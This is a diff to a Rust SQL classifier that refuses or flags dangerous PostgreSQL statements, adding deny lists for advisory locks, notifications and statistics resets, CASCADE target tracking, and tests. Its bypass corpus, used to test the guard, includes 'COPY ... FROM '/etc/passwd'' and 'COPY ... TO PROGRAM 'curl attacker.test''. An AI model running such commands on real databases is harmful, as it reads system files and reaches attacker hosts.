@@ -29,6 +29,11 @@ pub const BYPASS_CORPUS: &[&str] = &[
     "SELECT pg_cancel_backend(1)",
     "SELECT set_config('search_path', 'other', false)",
     "SELECT pg_reload_conf()",
+    "SELECT pg_notify('chan', 'x')",
+    "SELECT pg_advisory_lock(1)",
+    "SELECT pg_catalog.pg_try_advisory_xact_lock(1)",
+    "SELECT pg_stat_reset()",
+    "SELECT pg_stat_statements_reset()",
     "COPY orders TO '/tmp/out.csv'",
     "COPY orders FROM '/etc/passwd'",
     "COPY orders TO PROGRAM 'curl attacker.test'",
@@ -115,6 +120,36 @@ const DENIED_FUNCTIONS: [&str; 30] = [
     "pg_logdir_ls",
 ];
 
+const NOTIFY_AND_LOCK_FUNCTIONS: [&str; 8] = [
+    "pg_notify",
+    "pg_advisory_lock",
+    "pg_advisory_lock_shared",
+    "pg_try_advisory_lock",
+    "pg_try_advisory_lock_shared",
+    "pg_advisory_unlock",
+    "pg_advisory_unlock_shared",
+    "pg_advisory_unlock_all",
+];
+
+const TRANSACTION_LOCK_FUNCTIONS: [&str; 4] = [
+    "pg_advisory_xact_lock",
+    "pg_advisory_xact_lock_shared",
+    "pg_try_advisory_xact_lock",
+    "pg_try_advisory_xact_lock_shared",
+];
+
+const STATISTICS_RESET_FUNCTIONS: [&str; 9] = [
+    "pg_stat_reset",
+    "pg_stat_reset_shared",
+    "pg_stat_reset_single_table_counters",
+    "pg_stat_reset_single_function_counters",
+    "pg_stat_reset_slru",
+    "pg_stat_reset_replication_slot",
+    "pg_stat_reset_subscription_stats",
+    "pg_stat_reset_backend_stats",
+    "pg_stat_statements_reset",
+];
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
 pub enum StatementClass {
     Read,
@@ -169,6 +204,16 @@ pub struct Classification {
     pub runs_outside_transaction: bool,
     pub explain_analyze: bool,
     pub returning: bool,
+    pub returns_rows: bool,
+    pub cascade_targets: Vec<CascadeTarget>,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CascadeTarget {
+    pub kind: &'static str,
+    pub names: Vec<String>,
+    pub args: Option<Vec<String>>,
+    pub missing_ok: bool,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -241,6 +286,8 @@ pub fn classify(sql: &str) -> Result<Classification> {
         runs_outside_transaction: false,
         explain_analyze: false,
         returning: false,
+        returns_rows: false,
+        cascade_targets: Vec::new(),
     };
 
     let mut strongest = StatementClass::Read;
@@ -284,7 +331,24 @@ pub fn classify(sql: &str) -> Result<Classification> {
             classification.refusals.push(format!(
                 "the function `{bare}` reaches outside the database"
             ));
+        } else if NOTIFY_AND_LOCK_FUNCTIONS.contains(&bare.as_str()) {
+            classification.refusals.push(format!(
+                "the function `{bare}` sends a notification or takes an advisory lock that outlives the transaction, which this server does not run"
+            ));
+        } else if STATISTICS_RESET_FUNCTIONS.contains(&bare.as_str())
+            || TRANSACTION_LOCK_FUNCTIONS.contains(&bare.as_str())
+        {
+            strongest = strongest.max(StatementClass::Write);
         }
+    }
+    let executes = kind != "ExplainStmt" || classification.explain_analyze;
+    if executes && contains_key(&body, "LockingClause") {
+        strongest = strongest.max(StatementClass::Write);
+    }
+    classification.returns_rows = kind == "SelectStmt";
+    match cascade_targets(&kind, &body) {
+        Ok(targets) => classification.cascade_targets = targets,
+        Err(rule) => classification.refusals.push(rule),
     }
     for copy in &found.copies {
         if copy.is_from {
@@ -371,7 +435,206 @@ pub fn authorize(
             classification.class, classification.kind
         )));
     }
+    if classification.returns_rows && !mode.allows_reads() {
+        return Err(refuse(
+            "a SELECT returns table rows, which this mode does not allow even when the statement also writes"
+                .to_owned(),
+        ));
+    }
     Ok(())
+}
+
+pub(crate) fn select_shape(sql: &str) -> Option<(usize, Value)> {
+    let parsed = pg_query::parse(sql).ok()?;
+    let tree = serde_json::to_value(&parsed.protobuf).ok()?;
+    if tree.get("stmts").and_then(Value::as_array)?.len() != 1 {
+        return None;
+    }
+    let mut select = tree.pointer("/stmts/0/stmt/node/SelectStmt")?.clone();
+    let targets = select
+        .as_object_mut()?
+        .remove("target_list")
+        .and_then(|list| list.as_array().map(Vec::len))
+        .unwrap_or(0);
+    strip_locations(&mut select);
+    Some((targets, select))
+}
+
+fn strip_locations(value: &mut Value) {
+    match value {
+        Value::Object(object) => {
+            object.remove("location");
+            for child in object.values_mut() {
+                strip_locations(child);
+            }
+        }
+        Value::Array(items) => {
+            for item in items {
+                strip_locations(item);
+            }
+        }
+        _ => {}
+    }
+}
+
+const DROP_CASCADE: i64 = 2;
+const ALTER_DROP_COLUMN: i64 = 15;
+const ALTER_DROP_CONSTRAINT: i64 = 24;
+
+fn object_address_type(remove_type: i64) -> Option<&'static str> {
+    Some(match remove_type {
+        5 => "aggregate",
+        8 => "collation",
+        13 => "domain",
+        16 => "extension",
+        19 => "foreign table",
+        20 => "function",
+        21 => "index",
+        24 => "materialized view",
+        29 => "policy",
+        30 => "procedure",
+        35 => "routine",
+        36 => "rule",
+        37 => "schema",
+        38 => "sequence",
+        40 => "statistics object",
+        42 => "table",
+        45 => "trigger",
+        50 => "type",
+        52 => "view",
+        _ => return None,
+    })
+}
+
+fn strings(items: Option<&Value>) -> Vec<String> {
+    items
+        .and_then(Value::as_array)
+        .into_iter()
+        .flatten()
+        .filter_map(|item| item.pointer("/node/String/sval").and_then(Value::as_str))
+        .map(str::to_owned)
+        .collect()
+}
+
+fn type_name_text(type_name: &Value) -> String {
+    let mut text = strings(type_name.get("names")).join(".");
+    let dimensions = type_name
+        .get("array_bounds")
+        .and_then(Value::as_array)
+        .map_or(0, Vec::len);
+    for _ in 0..dimensions {
+        text.push_str("[]");
+    }
+    text
+}
+
+fn cascade_targets(kind: &str, body: &Value) -> std::result::Result<Vec<CascadeTarget>, String> {
+    let cascades =
+        |node: &Value| node.get("behavior").and_then(Value::as_i64) == Some(DROP_CASCADE);
+    let missing_ok = body
+        .get("missing_ok")
+        .and_then(Value::as_bool)
+        .unwrap_or(false);
+    match kind {
+        "DropStmt" if cascades(body) => {
+            let remove_type = body.get("remove_type").and_then(Value::as_i64).unwrap_or(0);
+            let Some(object_kind) = object_address_type(remove_type) else {
+                return Err(
+                    "CASCADE on this kind of object cannot be checked for dependents outside the served schema; drop the dependent objects first, then drop it without CASCADE"
+                        .to_owned(),
+                );
+            };
+            let objects = body
+                .get("objects")
+                .and_then(Value::as_array)
+                .map(Vec::as_slice)
+                .unwrap_or_default();
+            Ok(objects
+                .iter()
+                .map(|object| {
+                    if let Some(list) = object.pointer("/node/List/items") {
+                        return (strings(Some(list)), None);
+                    }
+                    if let Some(type_name) = object.pointer("/node/TypeName") {
+                        return (strings(type_name.get("names")), None);
+                    }
+                    if let Some(routine) = object.pointer("/node/ObjectWithArgs") {
+                        let args = (routine.get("args_unspecified").and_then(Value::as_bool)
+                            != Some(true))
+                        .then(|| {
+                            routine
+                                .get("objargs")
+                                .and_then(Value::as_array)
+                                .into_iter()
+                                .flatten()
+                                .filter_map(|arg| arg.pointer("/node/TypeName"))
+                                .map(type_name_text)
+                                .collect()
+                        });
+                        return (strings(routine.get("objname")), args);
+                    }
+                    let single = object
+                        .pointer("/node/String/sval")
+                        .and_then(Value::as_str)
+                        .map(|name| vec![name.to_owned()])
+                        .unwrap_or_default();
+                    (single, None)
+                })
+                .map(|(names, args)| CascadeTarget {
+                    kind: object_kind,
+                    names,
+                    args,
+                    missing_ok,
+                })
+                .collect())
+        }
+        "AlterTableStmt" => {
+            let relation = body.get("relation");
+            let table: Vec<String> = ["schemaname", "relname"]
+                .iter()
+                .filter_map(|key| relation.and_then(|relation| relation.get(*key)))
+                .filter_map(Value::as_str)
+                .filter(|part| !part.is_empty())
+                .map(str::to_owned)
+                .collect();
+            Ok(body
+                .get("cmds")
+                .and_then(Value::as_array)
+                .into_iter()
+                .flatten()
+                .filter_map(|command| command.pointer("/node/AlterTableCmd"))
+                .filter(|command| cascades(command))
+                .filter_map(|command| {
+                    let object_kind = match command.get("subtype").and_then(Value::as_i64) {
+                        Some(ALTER_DROP_COLUMN) => "table column",
+                        Some(ALTER_DROP_CONSTRAINT) => "table constraint",
+                        _ => return None,
+                    };
+                    let name = command.get("name").and_then(Value::as_str)?;
+                    let mut names = table.clone();
+                    names.push(name.to_owned());
+                    Some(CascadeTarget {
+                        kind: object_kind,
+                        names,
+                        args: None,
+                        missing_ok: command.get("missing_ok").and_then(Value::as_bool)
+                            == Some(true),
+                    })
+                })
+                .collect())
+        }
+        _ => Ok(Vec::new()),
+    }
+}
+
+fn contains_key(value: &Value, key: &str) -> bool {
+    match value {
+        Value::Object(object) => object
+            .iter()
+            .any(|(name, child)| name == key || contains_key(child, key)),
+        Value::Array(items) => items.iter().any(|item| contains_key(item, key)),
+        _ => false,
+    }
 }
 
 #[derive(Debug, Default)]
@@ -678,6 +941,14 @@ fn walk(value: &Value, found: &mut Findings) {
                             note_destructive(found, reason);
                         }
                     }
+                    "CreatePublicationStmt" => {
+                        if child.get("for_all_tables").and_then(Value::as_bool) == Some(true) {
+                            note_destructive(
+                                found,
+                                "CREATE PUBLICATION FOR ALL TABLES publishes every table in every schema, including tables created later, and UPDATE and DELETE then fail on any published table without a replica identity",
+                            );
+                        }
+                    }
                     "AlterPublicationStmt" => match child.get("action").and_then(Value::as_i64) {
                         Some(2) => note_destructive(
                             found,
@@ -781,15 +1052,52 @@ fn split_qualified(joined: &str) -> Option<RelationName> {
 fn where_is_absent_or_constant(statement: &Value) -> bool {
     match statement.get("where_clause") {
         None | Some(Value::Null) => true,
-        Some(clause) => is_constant_expression(clause),
+        Some(clause) => matches_every_row(clause),
     }
 }
 
 fn merge_matches_every_row(statement: &Value) -> bool {
     match statement.get("join_condition") {
         None | Some(Value::Null) => true,
-        Some(condition) => is_constant_expression(condition),
+        Some(condition) => matches_every_row(condition),
     }
+}
+
+const BOOL_AND: i64 = 1;
+const BOOL_OR: i64 = 2;
+const EXPRESSION_OPERATOR: i64 = 1;
+const EXPRESSION_NOT_DISTINCT: i64 = 5;
+
+fn matches_every_row(node: &Value) -> bool {
+    if is_constant_expression(node) {
+        return true;
+    }
+    if let Some(expr) = node.pointer("/node/BoolExpr") {
+        let args = expr
+            .get("args")
+            .and_then(Value::as_array)
+            .map(Vec::as_slice)
+            .unwrap_or_default();
+        return match expr.get("boolop").and_then(Value::as_i64) {
+            Some(BOOL_OR) => args.iter().any(matches_every_row),
+            Some(BOOL_AND) => !args.is_empty() && args.iter().all(matches_every_row),
+            _ => false,
+        };
+    }
+    if let Some(expr) = node.pointer("/node/AExpr") {
+        let operator = expr
+            .pointer("/name/0/node/String/sval")
+            .and_then(Value::as_str);
+        let self_comparison = match expr.get("kind").and_then(Value::as_i64) {
+            Some(EXPRESSION_NOT_DISTINCT) => true,
+            Some(EXPRESSION_OPERATOR) => matches!(operator, Some("=" | "<=" | ">=")),
+            _ => false,
+        };
+        let left = expr.pointer("/lexpr/node/ColumnRef/fields");
+        let right = expr.pointer("/rexpr/node/ColumnRef/fields");
+        return self_comparison && left.is_some() && left == right;
+    }
+    false
 }
 
 const MERGE_COMMAND_UPDATE: i64 = 3;
@@ -811,8 +1119,11 @@ fn merge_has_mutating_clause(statement: &Value) -> bool {
 }
 
 fn is_constant_expression(node: &Value) -> bool {
-    if node.pointer("/node/AConst").is_some() || node.pointer("/node/TypeCast").is_some() {
+    if node.pointer("/node/AConst").is_some() {
         return true;
+    }
+    if let Some(cast) = node.pointer("/node/TypeCast") {
+        return cast.get("arg").is_some_and(is_constant_expression);
     }
     if let Some(expr) = node.pointer("/node/AExpr") {
         let left = expr.get("lexpr");
@@ -953,7 +1264,35 @@ mod tests {
             Mode::ReadOnly,
         );
         allowed("COPY orders TO STDOUT", Mode::ReadOnly);
-        allowed("SELECT * FROM orders FOR UPDATE", Mode::ReadOnly);
+        allowed("EXPLAIN SELECT * FROM orders FOR UPDATE", Mode::ReadOnly);
+    }
+
+    #[test]
+    fn row_locks_and_transaction_locks_are_writes_that_still_need_reads() {
+        for sql in [
+            "SELECT * FROM orders FOR UPDATE",
+            "SELECT * FROM orders FOR SHARE SKIP LOCKED",
+            "SELECT * FROM (SELECT * FROM orders FOR NO KEY UPDATE) AS locked",
+            "SELECT pg_advisory_xact_lock(1)",
+            "SELECT pg_try_advisory_xact_lock_shared(1, 2)",
+        ] {
+            refused(sql, Mode::ReadOnly);
+            let message = refused(sql, Mode::WriteOnly);
+            assert!(message.contains("returns table rows"), "{sql}: {message}");
+            let classification = allowed(sql, Mode::ReadWrite);
+            assert_eq!(classification.class, StatementClass::Write, "{sql}");
+        }
+    }
+
+    #[test]
+    fn write_only_mode_refuses_a_select_that_also_writes() {
+        for sql in [
+            "WITH d AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM d",
+            "SELECT pg_stat_reset(), * FROM orders",
+        ] {
+            let message = refused(sql, Mode::WriteOnly);
+            assert!(message.contains("returns table rows"), "{sql}: {message}");
+        }
     }
 
     #[test]
@@ -963,6 +1302,34 @@ mod tests {
         for sql in corpus {
             let message = refused(sql, Mode::ReadOnly);
             assert!(!message.is_empty());
+        }
+    }
+
+    #[test]
+    fn notify_and_advisory_lock_functions_are_refused_in_every_mode() {
+        for sql in [
+            "SELECT pg_notify('chan', 'x')",
+            "SELECT pg_advisory_lock(1)",
+            "SELECT PG_CATALOG.PG_TRY_ADVISORY_LOCK(1, 2)",
+            "SELECT pg_advisory_unlock_all()",
+        ] {
+            for mode in [Mode::ReadOnly, Mode::WriteOnly, Mode::ReadWrite] {
+                let message = refused(sql, mode);
+                assert!(message.contains("advisory lock"), "{sql}: {message}");
+            }
+        }
+    }
+
+    #[test]
+    fn statistics_resets_are_writes_refused_in_read_only_mode() {
+        for sql in [
+            "SELECT pg_stat_reset()",
+            "SELECT pg_stat_reset_shared('io')",
+            "SELECT pg_stat_statements_reset()",
+        ] {
+            refused(sql, Mode::ReadOnly);
+            let classification = allowed(sql, Mode::ReadWrite);
+            assert_eq!(classification.class, StatementClass::Write, "{sql}");
         }
     }
 
@@ -1016,6 +1383,71 @@ mod tests {
     }
 
     #[test]
+    fn cascade_drops_name_what_they_target() {
+        let tables = classify_ok("DROP TABLE app.orders, items CASCADE");
+        assert_eq!(
+            tables.cascade_targets,
+            [
+                CascadeTarget {
+                    kind: "table",
+                    names: vec!["app".to_owned(), "orders".to_owned()],
+                    args: None,
+                    missing_ok: false,
+                },
+                CascadeTarget {
+                    kind: "table",
+                    names: vec!["items".to_owned()],
+                    args: None,
+                    missing_ok: false,
+                },
+            ]
+        );
+        let function = classify_ok("DROP FUNCTION IF EXISTS app.f(int, text[]) CASCADE");
+        assert_eq!(function.cascade_targets[0].kind, "function");
+        assert_eq!(
+            function.cascade_targets[0].args,
+            Some(vec!["pg_catalog.int4".to_owned(), "text[]".to_owned()])
+        );
+        assert!(function.cascade_targets[0].missing_ok);
+        let unspecified = classify_ok("DROP FUNCTION app.f CASCADE");
+        assert_eq!(unspecified.cascade_targets[0].args, None);
+        let column = classify_ok("ALTER TABLE app.orders DROP COLUMN note CASCADE");
+        assert_eq!(column.cascade_targets[0].kind, "table column");
+        assert_eq!(column.cascade_targets[0].names, ["app", "orders", "note"]);
+        assert!(classify_ok("DROP TABLE orders").cascade_targets.is_empty());
+        assert!(
+            classify_ok("ALTER TABLE orders DROP COLUMN note")
+                .cascade_targets
+                .is_empty()
+        );
+        let unknown = classify_ok("DROP TEXT SEARCH PARSER p CASCADE");
+        assert!(
+            unknown.refusals.iter().any(|rule| rule.contains("CASCADE")),
+            "{:?}",
+            unknown.refusals
+        );
+    }
+
+    #[test]
+    fn a_narrowing_predicate_is_not_mistaken_for_every_row() {
+        for sql in [
+            "DELETE FROM orders WHERE id = 1",
+            "DELETE FROM orders WHERE id = 1 AND 1 = 1",
+            "DELETE FROM orders WHERE id::text = '5'",
+            "UPDATE orders SET a = 1 WHERE id = parent_id",
+            "UPDATE orders SET a = 1 WHERE id <> id",
+            "DELETE FROM orders WHERE id = 1 OR id = 2",
+        ] {
+            let classification = allowed(sql, Mode::ReadWrite);
+            assert!(
+                classification.destructive_reason.is_none(),
+                "{sql}: {:?}",
+                classification.destructive_reason
+            );
+        }
+    }
+
+    #[test]
     fn destructive_shapes_are_flagged_with_their_reason() {
         for (sql, expected) in [
             ("DROP TABLE orders", "DROP"),
@@ -1025,6 +1457,18 @@ mod tests {
             ("DELETE FROM orders WHERE 1 = 1", "DELETE without"),
             ("UPDATE orders SET a = 1", "UPDATE without"),
             ("UPDATE orders SET a = 1 WHERE 'x' = 'x'", "UPDATE without"),
+            ("CREATE PUBLICATION p FOR ALL TABLES", "FOR ALL TABLES"),
+            ("DELETE FROM orders WHERE true OR id = 1", "DELETE without"),
+            ("DELETE FROM orders WHERE id = id", "DELETE without"),
+            (
+                "DELETE FROM orders WHERE id IS NOT DISTINCT FROM id",
+                "DELETE without",
+            ),
+            (
+                "UPDATE orders SET a = 1 WHERE (id = 1 OR 2 = 2) AND a = a",
+                "UPDATE without",
+            ),
+            ("DELETE FROM orders WHERE '1'::int = 1", "DELETE without"),
             ("ALTER TABLE orders DROP COLUMN a", "DROP COLUMN"),
             ("ALTER TABLE orders DROP CONSTRAINT c", "DROP CONSTRAINT"),
             ("ALTER TABLE orders DETACH PARTITION p", "DETACH PARTITION"),
@@ -1297,7 +1741,7 @@ mod properties {
                 let kind = classification.kind.as_str();
                 if classification.class == StatementClass::Read {
                     prop_assert!(
-                        !matches!(kind, "InsertStmt" | "UpdateStmt" | "DeleteStmt" | "CopyStmt" | "DropStmt" | "TruncateStmt"),
+                        !matches!(kind, "InsertStmt" | "UpdateStmt" | "DeleteStmt" | "DropStmt" | "TruncateStmt"),
                         "{kind} classified as a read: {sql}"
                     );
                 }
